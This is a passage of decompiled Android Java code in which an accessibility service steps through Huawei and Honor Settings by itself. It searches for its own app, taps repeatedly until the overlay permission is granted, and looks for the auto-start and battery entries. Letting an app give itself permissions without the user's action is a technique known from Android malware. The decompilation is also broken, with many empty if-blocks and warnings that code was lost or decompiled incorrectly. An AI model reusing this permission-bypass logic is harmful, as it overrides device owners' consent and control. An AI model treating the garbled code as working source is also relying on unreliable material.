                                if (b81.m210571b1(1000L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                }
            case 1:
                int i37 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a229 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i27 = i37;
                c0365a220 = c0365a229;
                if (((Boolean) objM212206g3).booleanValue()) {
                }
                return coroutineSingletons;
            case 2:
                int i38 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a230 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i26 = i38;
                c0365a219 = c0365a230;
                c0365a219.f55063a1.performGlobalAction(z11 ? 1 : 0);
                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a219;
                huaweiSteps$executeOverlayPermission$1.f54063a2 = i26;
                huaweiSteps$executeOverlayPermission$1.f54069a8 = 3;
                i25 = i26;
                c0365a218 = c0365a219;
                if (b81.m210571b1(500L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                }
                z9 = z11;
                str = str2;
                c1351vv = c1351vv2;
                i29 = i25;
                c0365a222 = c0365a218;
                str2 = str;
                c1351vv2 = c1351vv;
                z11 = z9;
                accessibilityNodeInfo2 = null;
                i34 = 4;
                i28 = i29 + 1;
                c0365a221 = c0365a222;
                if (i28 < i34) {
                }
                break;
            case 3:
                int i39 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a231 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i25 = i39;
                c0365a218 = c0365a231;
                z9 = z11;
                str = str2;
                c1351vv = c1351vv2;
                i29 = i25;
                c0365a222 = c0365a218;
                str2 = str;
                c1351vv2 = c1351vv;
                z11 = z9;
                accessibilityNodeInfo2 = null;
                i34 = 4;
                i28 = i29 + 1;
                c0365a221 = c0365a222;
                if (i28 < i34) {
                }
                break;
            case 4:
                int i40 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a232 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i24 = i40;
                c0365a217 = c0365a232;
                t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤4: 输入应用名");
                String[] strArr3 = {"android:id/search_src_text", "com.android.settings:id/search_src_text", "com.hihonor.settings:id/search_src_text"};
                rootInActiveWindow = c0365a217.f55063a1.getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                }
                z7 = false;
                i22 = i24;
                c0365a215 = c0365a217;
                if (!z7) {
                }
                t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤5: 等待搜索结果");
                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a215;
                huaweiSteps$executeOverlayPermission$1.f54062a1 = accessibilityNodeInfo2;
                huaweiSteps$executeOverlayPermission$1.f54063a2 = i22;
                huaweiSteps$executeOverlayPermission$1.f54069a8 = 6;
                i21 = i22;
                c0365a214 = c0365a215;
                if (b81.m210571b1(1000L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                r5 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                AccessibilityNodeInfo accessibilityNodeInfo3 = huaweiSteps$executeOverlayPermission$1.f54062a1;
                C0365a2 c0365a233 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                try {
                    kg1.m213544f4(objM212206g3);
                    accessibilityNodeInfo = accessibilityNodeInfo3;
                    c0365a216 = c0365a233;
                    i23 = r5;
                } catch (Exception e14) {
                    e = e14;
                    r18 = 1;
                    c0365a22 = c0365a233;
                    i = r5;
                    str = str2;
                    c1351vv = c1351vv2;
                    i30 = i;
                    c0365a223 = c0365a22;
                    z8 = r18;
                    tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                    i29 = i30;
                    c0365a222 = c0365a223;
                    z9 = z8;
                    str2 = str;
                    c1351vv2 = c1351vv;
                    z11 = z9;
                    accessibilityNodeInfo2 = null;
                    i34 = 4;
                    i28 = i29 + 1;
                    c0365a221 = c0365a222;
                    if (i28 < i34) {
                    }
                }
                Bundle bundle2 = new Bundle();
                bundle2.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", c0365a216.m212178d1());
                accessibilityNodeInfo.performAction(2097152, bundle2);
                t60.m214704c5("HuaweiSteps", "[悬浮窗] 输入: " + c0365a216.m212178d1());
                z7 = z11 ? 1 : 0;
                i22 = i23;
                c0365a215 = c0365a216;
                if (!z7) {
                }
                t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤5: 等待搜索结果");
                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a215;
                huaweiSteps$executeOverlayPermission$1.f54062a1 = accessibilityNodeInfo2;
                huaweiSteps$executeOverlayPermission$1.f54063a2 = i22;
                huaweiSteps$executeOverlayPermission$1.f54069a8 = 6;
                i21 = i22;
                c0365a214 = c0365a215;
                if (b81.m210571b1(1000L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                int i41 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a234 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i21 = i41;
                c0365a214 = c0365a234;
                String strM212178d13 = c0365a214.m212178d1();
                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a214;
                huaweiSteps$executeOverlayPermission$1.f54063a2 = i21;
                huaweiSteps$executeOverlayPermission$1.f54069a8 = 7;
                objM212217h5 = c0365a214.m212217h5(strM212178d13, huaweiSteps$executeOverlayPermission$1);
                i20 = i21;
                c0365a213 = c0365a214;
                if (objM212217h5 == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                int i42 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a235 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i20 = i42;
                c0365a213 = c0365a235;
                t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤6: 点击应用");
                zBooleanValue = c0365a213.m212157a0(c0365a213.m212178d1());
                i33 = i20;
                r7 = c0365a213;
                if (zBooleanValue) {
                }
                return coroutineSingletons;
            case 8:
                int i43 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a236 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i19 = i43;
                c0365a212 = c0365a236;
                zBooleanValue = ((Boolean) objM212206g3).booleanValue();
                i33 = i19;
                r7 = c0365a212;
                if (zBooleanValue) {
                }
                return coroutineSingletons;
            case 9:
                int i44 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a237 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i8 = i44;
                c0365a25 = c0365a237;
                c0365a25.f55063a1.performGlobalAction(z11 ? 1 : 0);
                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a25;
                huaweiSteps$executeOverlayPermission$1.f54063a2 = i8;
                huaweiSteps$executeOverlayPermission$1.f54069a8 = 10;
                i25 = i8;
                c0365a218 = c0365a25;
                if (b81.m210571b1(500L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                }
                z9 = z11;
                str = str2;
                c1351vv = c1351vv2;
                i29 = i25;
                c0365a222 = c0365a218;
                str2 = str;
                c1351vv2 = c1351vv;
                z11 = z9;
                accessibilityNodeInfo2 = null;
                i34 = 4;
                i28 = i29 + 1;
                c0365a221 = c0365a222;
                if (i28 < i34) {
                }
                break;
            case 10:
                int i45 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a238 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i31 = i45;
                c0365a228 = c0365a238;
                i25 = i31;
                c0365a218 = c0365a228;
                z9 = z11;
                str = str2;
                c1351vv = c1351vv2;
                i29 = i25;
                c0365a222 = c0365a218;
                str2 = str;
                c1351vv2 = c1351vv;
                z11 = z9;
                accessibilityNodeInfo2 = null;
                i34 = 4;
                i28 = i29 + 1;
                c0365a221 = c0365a222;
                if (i28 < i34) {
                }
                break;
            case oe0.DEFAULT_M /* 11 */:
                int i46 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a239 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i33 = i46;
                r7 = c0365a239;
                t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤7: 验证悬浮窗详情页");
                if (r7.m212191e7()) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                int i47 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a240 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i9 = i47;
                c0365a26 = c0365a240;
                c0365a26.f55063a1.performGlobalAction(z11 ? 1 : 0);
                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a26;
                huaweiSteps$executeOverlayPermission$1.f54063a2 = i9;
                huaweiSteps$executeOverlayPermission$1.f54069a8 = 13;
                i25 = i9;
                c0365a218 = c0365a26;
                if (b81.m210571b1(500L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                }
                z9 = z11;
                str = str2;
                c1351vv = c1351vv2;
                i29 = i25;
                c0365a222 = c0365a218;
                str2 = str;
                c1351vv2 = c1351vv;
                z11 = z9;
                accessibilityNodeInfo2 = null;
                i34 = 4;
                i28 = i29 + 1;
                c0365a221 = c0365a222;
                if (i28 < i34) {
                }
                break;
            case 13:
                int i48 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a241 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i31 = i48;
                c0365a228 = c0365a241;
                i25 = i31;
                c0365a218 = c0365a228;
                z9 = z11;
                str = str2;
                c1351vv = c1351vv2;
                i29 = i25;
                c0365a222 = c0365a218;
                str2 = str;
                c1351vv2 = c1351vv;
                z11 = z9;
                accessibilityNodeInfo2 = null;
                i34 = 4;
                i28 = i29 + 1;
                c0365a221 = c0365a222;
                if (i28 < i34) {
                }
                break;
            case 14:
                i13 = huaweiSteps$executeOverlayPermission$1.f54066a5;
                int i49 = huaweiSteps$executeOverlayPermission$1.f54065a4;
                i11 = huaweiSteps$executeOverlayPermission$1.f54064a3;
                i10 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a242 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i12 = i49;
                ?? r185 = 1;
                C0365a2 c0365a243 = c0365a242;
                str = str2;
                try {
                } catch (Exception e15) {
                    e = e15;
                    c1351vv = c1351vv2;
                    break;
                }
                if (i13 % 3 != 0) {
                    c0365a243.m212158a1();
                    huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a243;
                    huaweiSteps$executeOverlayPermission$1.f54063a2 = i10;
                    huaweiSteps$executeOverlayPermission$1.f54064a3 = i11;
                    huaweiSteps$executeOverlayPermission$1.f54065a4 = i12;
                    huaweiSteps$executeOverlayPermission$1.f54066a5 = i13;
                    huaweiSteps$executeOverlayPermission$1.f54069a8 = 15;
                    c1351vv = c1351vv2;
                    if (b81.m210571b1(100L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                        c0365a27 = c0365a243;
                        i15 = i12;
                        r183 = r185;
                        i12 = i15;
                        C0365a2 c0365a244 = c0365a27;
                        boolean z12 = r183;
                        iM212181d5 = i11;
                        int i50 = i13 + 1;
                        c1351vv2 = c1351vv;
                        i14 = i10;
                        r12 = i50;
                        c0365a28 = c0365a244;
                        z2 = z12;
                        i18 = i14;
                        c0365a211 = c0365a28;
                        z5 = z2;
                        if (r12 < 11) {
                            if (Settings.canDrawOverlays(c0365a28.f55062a0)) {
                                t60.m214704c5("HuaweiSteps", "[悬浮窗] 权限已开启");
                                i18 = i14;
                                c0365a211 = c0365a28;
                                z5 = z2;
                            } else {
                                t60.m214704c5("HuaweiSteps", "[悬浮窗] 第" + r12 + "次点击: (" + iM212181d5 + ", " + i12 + str);
                                c0365a28.m212202f9((float) iM212181d5, (float) i12);
                                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a28;
                                huaweiSteps$executeOverlayPermission$1.f54063a2 = i14;
                                huaweiSteps$executeOverlayPermission$1.f54064a3 = iM212181d5;
                                huaweiSteps$executeOverlayPermission$1.f54065a4 = i12;
                                huaweiSteps$executeOverlayPermission$1.f54066a5 = r12;
                                huaweiSteps$executeOverlayPermission$1.f54069a8 = 14;
                                if (b81.m210571b1(300L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                                    i11 = iM212181d5;
                                    i10 = i14;
                                    i13 = r12;
                                    c0365a243 = c0365a28;
                                    r185 = z2;
                                    if (i13 % 3 != 0) {
                                        c1351vv = c1351vv2;
                                        c0365a244 = c0365a243;
                                        z12 = r185;
                                        iM212181d5 = i11;
                                        int i502 = i13 + 1;
                                        c1351vv2 = c1351vv;
                                        i14 = i10;
                                        r12 = i502;
                                        c0365a28 = c0365a244;
                                        z2 = z12;
                                        i18 = i14;
                                        c0365a211 = c0365a28;
                                        z5 = z2;
                                        if (r12 < 11) {
                                        }
                                    }
                                }
                            }
                        }
                        c1351vv = c1351vv2;
                        if (Settings.canDrawOverlays(c0365a211.f55062a0)) {
                        }
                    }
                    return coroutineSingletons;
                }
                break;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                i13 = huaweiSteps$executeOverlayPermission$1.f54066a5;
                i15 = huaweiSteps$executeOverlayPermission$1.f54065a4;
                i11 = huaweiSteps$executeOverlayPermission$1.f54064a3;
                i10 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                c0365a27 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                r183 = 1;
                str = str2;
                c1351vv = c1351vv2;
                i12 = i15;
                C0365a2 c0365a2442 = c0365a27;
                boolean z122 = r183;
                iM212181d5 = i11;
                int i5022 = i13 + 1;
                c1351vv2 = c1351vv;
                i14 = i10;
                r12 = i5022;
                c0365a28 = c0365a2442;
                z2 = z122;
                i18 = i14;
                c0365a211 = c0365a28;
                z5 = z2;
                if (r12 < 11) {
                }
                c1351vv = c1351vv2;
                if (Settings.canDrawOverlays(c0365a211.f55062a0)) {
                }
                break;
            case 16:
                int i51 = huaweiSteps$executeOverlayPermission$1.f54064a3;
                int i52 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a245 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i4 = i51;
                i2 = i52;
                r182 = 1;
                c0365a23 = c0365a245;
                str = str2;
                c1351vv = c1351vv2;
                i3 = 6;
                zCanDrawOverlays = Settings.canDrawOverlays(c0365a23.f55062a0);
                i5 = i2;
                c0365a24 = c0365a23;
                z = r182;
                if (zCanDrawOverlays) {
                }
                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a24;
                huaweiSteps$executeOverlayPermission$1.f54063a2 = i5;
                huaweiSteps$executeOverlayPermission$1.f54064a3 = i4;
                huaweiSteps$executeOverlayPermission$1.f54069a8 = 17;
                if (b81.m210571b1(100L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                }
                break;
            case 17:
                i7 = huaweiSteps$executeOverlayPermission$1.f54064a3;
                int i53 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a246 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                i6 = i53;
                r184 = 1;
                c0365a225 = c0365a246;
                str = str2;
                c1351vv = c1351vv2;
                i3 = 6;
                r52 = i7 + 1;
                c0365a224 = c0365a225;
                z10 = r184;
                if (r52 < i3) {
                }
                break;
            case 18:
                int i54 = huaweiSteps$executeOverlayPermission$1.f54063a2;
                C0365a2 c0365a247 = huaweiSteps$executeOverlayPermission$1.f54061a0;
                kg1.m213544f4(objM212206g3);
                c1351vv = c1351vv2;
                c0365a227 = c0365a247;
                if (Settings.canDrawOverlays(c0365a227.f55062a0)) {
                    t60.m214704c5("HuaweiSteps", "[悬浮窗] 权限开启成功");
                    c0365a226 = c0365a227;
                } else {
                    t60.m214704c5("HuaweiSteps", "[悬浮窗] 权限仍未开启，可能需要手动处理");
                    c0365a226 = c0365a227;
                }
                c0365a226.m212195f2(c0365a226.f55072b0);
                t60.m214704c5("HuaweiSteps", "[悬浮窗] 完成");
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:34:0x00d9, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L49;
     */
    /* JADX WARN: Removed duplicated region for block: B:21:0x006e  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x00b4  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x010e  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x012d  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x0135  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x013b  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:46:0x010b -> B:32:0x00b2). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:50:0x0120 -> B:51:0x0125). Please report as a decompilation issue!!! */
    /* renamed from: c0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212173c0(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$findAndClickApps$1 huaweiSteps$findAndClickApps$1;
        C0365a2 c0365a2;
        int i;
        C0365a2 c0365a22;
        int i2;
        if (continuationImpl instanceof HuaweiSteps$findAndClickApps$1) {
            huaweiSteps$findAndClickApps$1 = (HuaweiSteps$findAndClickApps$1) continuationImpl;
            int i3 = huaweiSteps$findAndClickApps$1.f54075a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$findAndClickApps$1.f54075a5 = i3 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$findAndClickApps$1 = new HuaweiSteps$findAndClickApps$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$findAndClickApps$1.f54073a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = huaweiSteps$findAndClickApps$1.f54075a5;
        i40 i40Var = f55053b9;
        int i5 = 3;
        if (i4 != 0) {
            if (i4 == 1) {
                i2 = huaweiSteps$findAndClickApps$1.f54072a2;
                int i6 = huaweiSteps$findAndClickApps$1.f54071a1;
                C0365a2 c0365a23 = huaweiSteps$findAndClickApps$1.f54070a0;
                kg1.m213544f4(obj);
                i = i6;
                c0365a22 = c0365a23;
                for (String str : i40Var.getAUTO_START_ENTRY_TEXTS()) {
                    if (((Boolean) c0365a22.f55080b8.getValue()).booleanValue() ? m212142a4(c0365a22, str) : c0365a22.m212160a3(str, true)) {
                        tz0.m214807a7("[应用] 上滑后找到并点击: ", str, "HuaweiSteps");
                        return Boolean.TRUE;
                    }
                }
                i2++;
                i5 = 3;
                if (i2 >= i5) {
                }
                return coroutineSingletons;
            }
            if (i4 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i7 = huaweiSteps$findAndClickApps$1.f54071a1;
            c0365a22 = huaweiSteps$findAndClickApps$1.f54070a0;
            kg1.m213544f4(obj);
            if (((Boolean) obj).booleanValue()) {
                t60.m214704c5("HuaweiSteps", "[应用] 重新打开设置失败");
                return Boolean.FALSE;
            }
            i = i7 + 1;
            c0365a2 = c0365a22;
            i5 = 3;
            if (i < i5) {
                t60.m214704c5("HuaweiSteps", "[应用] 2次尝试后仍未找到应用和服务入口");
                return Boolean.FALSE;
            }
            t60.m214704c5("HuaweiSteps", "[应用] 第" + i + "次尝试");
            for (String str2 : i40Var.getAUTO_START_ENTRY_TEXTS()) {
                if (((Boolean) c0365a2.f55080b8.getValue()).booleanValue() ? m212142a4(c0365a2, str2) : c0365a2.m212160a3(str2, true)) {
                    tz0.m214807a7("[应用] 找到并点击: ", str2, "HuaweiSteps");
                    return Boolean.TRUE;
                }
            }
            c0365a22 = c0365a2;
            i2 = 1;
            if (i2 >= i5) {
                t60.m214704c5("HuaweiSteps", "[应用] 第" + i2 + "次上滑");
                c0365a22.m212204g1();
                huaweiSteps$findAndClickApps$1.f54070a0 = c0365a22;
                huaweiSteps$findAndClickApps$1.f54071a1 = i;
                huaweiSteps$findAndClickApps$1.f54072a2 = i2;
                huaweiSteps$findAndClickApps$1.f54075a5 = 1;
            } else {
                t60.m214704c5("HuaweiSteps", "[应用] 上滑2次没找到，重新打开设置");
                huaweiSteps$findAndClickApps$1.f54070a0 = c0365a22;
                huaweiSteps$findAndClickApps$1.f54071a1 = i;
                huaweiSteps$findAndClickApps$1.f54075a5 = 2;
                Object objM212197f4 = c0365a22.m212197f4(huaweiSteps$findAndClickApps$1);
                if (objM212197f4 != coroutineSingletons) {
                    i7 = i;
                    obj = objM212197f4;
                    if (((Boolean) obj).booleanValue()) {
                    }
                }
            }
            return coroutineSingletons;
        }
        kg1.m213544f4(obj);
        t60.m214714d6("HuaweiSteps", "[应用] 查找应用和服务");
        if (((Boolean) this.f55080b8.getValue()).booleanValue()) {
            t60.m214704c5("HuaweiSteps", "[应用] 折叠屏设备，使用全窗口搜索");
        }
        c0365a2 = this;
        i = 1;
        if (i < i5) {
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: c1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212174c1(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$findAndClickBattery$1 huaweiSteps$findAndClickBattery$1;
        C0365a2 c0365a2;
        if (continuationImpl instanceof HuaweiSteps$findAndClickBattery$1) {
            huaweiSteps$findAndClickBattery$1 = (HuaweiSteps$findAndClickBattery$1) continuationImpl;
            int i = huaweiSteps$findAndClickBattery$1.f54079a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                huaweiSteps$findAndClickBattery$1.f54079a3 = i - Integer.MIN_VALUE;
            } else {
                huaweiSteps$findAndClickBattery$1 = new HuaweiSteps$findAndClickBattery$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$findAndClickBattery$1.f54077a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = huaweiSteps$findAndClickBattery$1.f54079a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            t60.m214704c5("HuaweiSteps", "[电池] 找电池");
            if (m212160a3("电池", false)) {
                t60.m214704c5("HuaweiSteps", "[电池] 找到并点击电池");
                return Boolean.TRUE;
            }
            t60.m214704c5("HuaweiSteps", "[电池] 上滑1次（往下看）");
            m212204g1();
            huaweiSteps$findAndClickBattery$1.f54076a0 = this;
            huaweiSteps$findAndClickBattery$1.f54079a3 = 1;
            if (m212216h4(3, 1000L, huaweiSteps$findAndClickBattery$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
            c0365a2 = this;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0365a2 = huaweiSteps$findAndClickBattery$1.f54076a0;
            kg1.m213544f4(obj);
        }
        if (c0365a2.m212160a3("电池", false)) {
            t60.m214704c5("HuaweiSteps", "[电池] 上滑后找到电池");
            return Boolean.TRUE;
        }
        t60.m214704c5("HuaweiSteps", "[电池] 未找到电池");
        return Boolean.FALSE;
    }

    /* renamed from: c2 */
    public final Rect m212175c2() {
        AccessibilityNodeInfo next;
        Context context = this.f55062a0;
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        try {
            if (rootInActiveWindow == null) {
                return null;
            }
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(m212178d1());
                if (listFindAccessibilityNodeInfosByText == null) {
                    listFindAccessibilityNodeInfosByText = EmptyList.f57568a0;
                }
                Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByText.iterator();
                do {
                    if (!it.hasNext()) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText(context.getPackageName());
                        if (listFindAccessibilityNodeInfosByText2 == null) {
                            listFindAccessibilityNodeInfosByText2 = EmptyList.f57568a0;
                        }
                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText2) {
                            if (accessibilityNodeInfo.isVisibleToUser()) {
                                Rect rect = new Rect();
                                accessibilityNodeInfo.getBoundsInScreen(rect);
                                t60.m214704c5("HuaweiSteps", "[查找APP卡片] ✅ 通过包名找到APP: " + context.getPackageName() + ", 位置: " + rect);
                                rootInActiveWindow.recycle();
                                return rect;
                            }
                        }
                        String string = context.getString(R$string.app_name);
                        t60.m214694b5(string, "context.getString(R.string.app_name)");
                        String strM212178d1 = m212178d1();
                        String str = (String) AbstractC0715je.m213297i4(AbstractC0779a1.m213677d0(m212178d1(), new String[]{"."}, 6));
                        if (str == null) {
                            str = "";
                        }
                        for (String str2 : AbstractC0716jf.m213306g5(string, strM212178d1, str)) {
                            if (!AbstractC0779a1.m213663b6(str2)) {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText(str2);
                                if (listFindAccessibilityNodeInfosByText3 == null) {
                                    listFindAccessibilityNodeInfosByText3 = EmptyList.f57568a0;
                                }
                                for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText3) {
                                    if (accessibilityNodeInfo2.isVisibleToUser()) {
                                        Rect rect2 = new Rect();
                                        accessibilityNodeInfo2.getBoundsInScreen(rect2);
                                        t60.m214704c5("HuaweiSteps", "[查找APP卡片] ✅ 通过名称变体找到APP: " + str2 + ", 位置: " + rect2);
                                        rootInActiveWindow.recycle();
                                        return rect2;
                                    }
                                }
                            }
                        }
                        t60.m214704c5("HuaweiSteps", "[查找APP卡片] ❌ 未找到APP卡片");
                        rootInActiveWindow.recycle();
                        return null;
                    }
                    next = it.next();
                } while (!next.isVisibleToUser());
                Rect rect3 = new Rect();
                next.getBoundsInScreen(rect3);
                t60.m214704c5("HuaweiSteps", "[查找APP卡片] ✅ 通过名称找到APP: " + m212178d1() + ", 位置: " + rect3);
                rootInActiveWindow.recycle();
                return rect3;
            } catch (Exception e) {
                t60.m214704c5("HuaweiSteps", "[查找APP卡片] 异常: " + e.getMessage());
                rootInActiveWindow.recycle();
                return null;
            }
        } catch (Throwable th) {
            rootInActiveWindow.recycle();
            throw th;
        }
    }

    /* renamed from: c7 */
    public final AccessibilityNodeInfo m212176c7(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM212150c9 = m212150c9(this, accessibilityNodeInfo);
        if (accessibilityNodeInfoM212150c9 != null) {
            return accessibilityNodeInfoM212150c9;
        }
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        for (int i = 0; parent != null && i < 5; i++) {
            AccessibilityNodeInfo accessibilityNodeInfoM212150c92 = m212150c9(this, parent);
            if (accessibilityNodeInfoM212150c92 != null) {
                return accessibilityNodeInfoM212150c92;
            }
            parent = parent.getParent();
        }
        return null;
    }

    /* renamed from: c8 */
    public final AccessibilityNodeInfo m212177c8(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212177c8;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        for (String str : f55054c0) {
            if ((AbstractC0779a1.m213652a5(string, str, true) || AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "Toggle", true) || AbstractC0779a1.m213652a5(string, "CheckBox", true) || AbstractC0779a1.m213652a5(string, "Checkable", true)) && accessibilityNodeInfo.isVisibleToUser()) {
                Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
                if (rectM24a5.width() > 20 && rectM24a5.height() > 20) {
                    return accessibilityNodeInfo;
                }
            }
        }
        if (accessibilityNodeInfo.isCheckable() && accessibilityNodeInfo.isVisibleToUser()) {
            Rect rectM24a52 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
            if (rectM24a52.left > m212181d5() / 2 || rectM24a52.width() > 50) {
                t60.m214704c5("HuaweiSteps", "[findSwitchInNode] 找到可切换控件: class=" + string + ", checked=" + accessibilityNodeInfo.isChecked() + ", bounds=" + rectM24a52);
                return accessibilityNodeInfo;
            }
        }
        String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        String str2 = viewIdResourceName != null ? viewIdResourceName : "";
        if ((AbstractC0779a1.m213652a5(str2, "switch", true) || AbstractC0779a1.m213652a5(str2, "toggle", true) || AbstractC0779a1.m213652a5(str2, "checkbox", true)) && accessibilityNodeInfo.isVisibleToUser()) {
            t60.m214704c5("HuaweiSteps", "[findSwitchInNode] 通过viewId找到开关: ".concat(str2));
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212177c8 = m212177c8(child)) != null) {
                return accessibilityNodeInfoM212177c8;
